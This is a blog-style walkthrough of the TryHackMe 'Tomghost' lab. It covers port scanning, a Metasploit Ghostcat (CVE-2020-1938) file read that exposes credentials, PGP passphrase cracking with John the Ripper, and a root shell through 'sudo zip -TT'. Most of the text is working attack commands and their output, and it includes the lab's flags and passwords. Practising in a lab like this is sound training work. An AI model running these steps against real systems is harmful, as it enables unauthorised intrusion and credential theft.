---
layout: post
title: Tomghost
subtitle: TryHackMe - Tomghost
description: Enumerate services, exploit Ghostcat CVE, decrypt credentials, and escalate privileges with sudo zip to capture flags.
image: https://assets.tryhackme.com/additional/imgur/fR0jVuM.png
optimized_image: https://assets.tryhackme.com/additional/imgur/fR0jVuM.png
tags:
  - TryHackMe
  - Ghostcat
  - CVE-2020-1938
  - PGP Decryption
  - Sudo Zip Privesc
  - Find Flags
author: Mustafa Altayeb
date: 2025-10-28 00:00
paginate: true
---

# Tomghost

![Tomghost](https://assets.tryhackme.com/additional/imgur/fR0jVuM.png)

## Objectives
1. **Scan with Nmap** to identify open ports and services.
2. **Exploit Ghostcat (CVE-2020-1938)** on AJP port 8009 to extract credentials from `/WEB-INF/web.xml`.
3. **Gain initial SSH access** as user `skyfuck`.
4. **Locate and read the user flag** in `/home/merlin/user.txt`.
5. **Decrypt `credential.pgp`** using the private key `tryhackme.asc` (crack passphrase with John the Ripper).
6. **Switch to user `merlin`** using the decrypted password.
7. **Privilege escalate to root** using `sudo zip` abuse.
8. **Capture the root flag**.

## Enumeration

### Nmap Scan
Perform a comprehensive port scan:

```bash
nmap -sCV -p- -T4 -oA nmap_tomghost 10.10.182.213
```

**Results:**
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key Findings:**
- **Port 22**: OpenSSH 7.2p2 (username enumeration possible but not exploited here).
- **Port 8009**: Apache JServ Protocol (AJP) exposed â€“ vulnerable to **Ghostcat (CVE-2020-1938)**.
- **Port 8080**: Apache Tomcat 9.0.30 (outdated version).

## Initial Access

### Exploit Ghostcat with Metasploit
Use the Metasploit module to read sensitive files via AJP:

```bash
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.10.182.213
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
```

**Key Excerpt from `web.xml`:**
```
<description>
   Welcome to GhostCat
      skyfuck:8730281lkjlkjdqlksalks
</description>
```

**Credentials Discovered:**
- Username: `skyfuck`
- Password: `8730281lkjlkjdqlksalks`

### SSH Access
Login as `skyfuck`:

```bash
ssh skyfuck@10.10.182.213
```

```
skyfuck@ubuntu:~$ whoami
skyfuck
```

## User Flag
Read the user flag (accessible from `skyfuck`):

```bash
skyfuck@ubuntu:~$ cat /home/merlin/user.txt
THM{GhostCat_1s_so_cr4sy}
```

## Decrypt Credentials for `merlin`
In `/home/skyfuck/`:

```bash
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

Transfer files to attacker machine:

```bash
# On target
python3 -m http.server 8000

# On attacker
wget http://10.10.182.213:8000/credential.pgp
wget http://10.10.182.213:8000/tryhackme.asc
```

**Crack `tryhackme.asc` passphrase with John:**
```bash
gpg2john tryhackme.asc > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash
```
**Passphrase:** `alexandru`

**Decrypt `credential.pgp`:**
```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
**Output:**
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j#
```

**Switch to `merlin`:**
```bash
skyfuck@ubuntu:~$ su merlin
Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j#
merlin@ubuntu:~$
```

## Privilege Escalation
Enumerate sudo permissions:

```bash
merlin@ubuntu:~$ sudo -l
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

**Exploit `sudo zip` (GTFOBins):**
```bash
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
adding: etc/hosts (deflated 31%)
# whoami
root
```

## Root Flag
```bash
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```

**Finished! Happy Hacking!**

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

**Follow me:**
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)
```